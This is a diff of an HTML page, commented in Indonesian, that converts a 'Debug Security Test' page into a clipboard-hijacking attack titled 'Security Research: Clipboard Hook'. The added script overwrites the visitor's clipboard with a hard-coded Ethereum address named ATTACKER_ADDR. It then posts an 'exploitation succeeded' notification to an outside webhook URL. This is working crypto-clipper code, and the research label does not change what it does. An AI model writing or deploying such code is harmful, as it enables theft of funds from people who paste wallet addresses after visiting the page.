@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Debug Security Test</title>
+    <title>Security Research: Clipboard Hook</title>
     <style>
         body { font-family: monospace; padding: 20px; line-height: 1.4; font-size: 14px; }
         .log { background: #000; color: #0f0; padding: 10px; border-radius: 5px; margin-top: 20px; word-break: break-all; }
-        button { width: 100%; padding: 15px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; }
+        button { width: 100%; padding: 15px; font-size: 16px; background: #dc3545; color: white; border: none; border-radius: 5px; }
     </style>
 </head>
 <body>
@@ -17,20 +17,36 @@
     <div class="log" id="logBox">Status: Menunggu aksi...</div>
 
     <script>
+        const WEBHOOK_URL = "
+ https://webhooksite.net/82a7aeea-acdd-4acd-8b4e-cae50d93599b"; // Ganti dengan Webhook URL Anda
+        const ATTACKER_ADDR = "0xcB108eeDbaAfc5b6aA9Cb2Cb93Fd801a238b6179";
+
         function log(msg) {
             document.getElementById('logBox').innerText = msg;
-            console.log(msg);
+        }
+
+        async function sendWebhook(status) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "🚨 Eksploitasi Berhasil: " + status })
+                });
+            } catch (e) {
+                console.error("Webhook gagal dikirim");
+            }
         }
 
         async function runTest() {
-            const ATTACKER_ADDR = "0xATTACKER_TEST_ADDRESS";
-            
             log("Mencoba akses clipboard...");
             
             try {
-                // Mencoba menulis ke clipboard setelah klik (interaksi user)
+                // Menulis alamat penyerang ke clipboard
                 await navigator.clipboard.writeText(ATTACKER_ADDR);
-                log("SUKSES: Clipboard tertulis!");
+                log("SUKSES: Alamat telah diganti ke: " + ATTACKER_ADDR);
+                
+                // Mengirim notifikasi ke webhook
+                await sendWebhook("Clipboard telah di-overwrite menjadi " + ATTACKER_ADDR);
             } catch (err) {
                 log("DIBLOKIR/ERROR: " + err.message);
             }
